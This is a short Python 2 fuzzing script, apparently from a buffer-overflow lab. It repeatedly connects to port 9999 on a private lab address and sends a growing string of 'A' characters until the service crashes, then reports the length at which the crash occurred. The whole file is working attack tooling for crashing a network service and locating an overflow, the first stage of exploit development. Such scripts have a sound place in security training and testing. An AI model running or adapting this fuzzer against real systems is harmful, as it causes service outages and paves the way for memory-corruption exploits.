import socket
import sys
from time import sleep

buffer = 'A' * 100

while True:
  try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect(('192.168.56.1',9999))
    s.recv(1024)
    
    print '[*] Sending buffer with length: ' + str(len(buffer))
    s.send(buffer + '\r\n')
    s.close()
    sleep(2)
    buffer = buffer + 'A' * 100
    
  except:
    print '[*] Crash occurred at buffer length: ' + str(len(buffer)-100)
    sys.exit()
